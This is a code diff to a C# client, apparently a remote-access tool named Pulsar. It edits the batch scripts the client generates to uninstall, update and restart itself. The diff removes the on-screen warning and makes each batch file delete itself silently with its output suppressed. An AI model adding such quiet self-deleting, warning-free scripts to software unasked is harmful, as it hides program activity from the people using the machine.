@@ -21,10 +21,9 @@ namespace Pulsar.Client.IO
             string uninstallBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
-                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                 "timeout /T 5 /NOBREAK > nul" + "\r\n" +
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "del /a /q /f " + "\"" + batchFile + "\"";
+                "del \"%~f0\" /a /f /q >nul 2>&1 & exit";
 
             File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
             return batchFile;
@@ -43,12 +42,11 @@ namespace Pulsar.Client.IO
             string updateBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
-                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                 "timeout /T 5 /NOBREAK > nul" + "\r\n" +
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "del /a /q /f " + "\"" + batchFile + "\"";
+                "del \"%~f0\" /a /f /q >nul 2>&1 & exit";
 
             File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
             return batchFile;
@@ -66,10 +64,9 @@ namespace Pulsar.Client.IO
             string restartBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
-                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                 "timeout /T 5 /NOBREAK > nul" + "\r\n" +
                 "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "del /a /q /f " + "\"" + batchFile + "\"";
+                "del \"%~f0\" /a /f /q >nul 2>&1 & exit";
 
             File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));
 
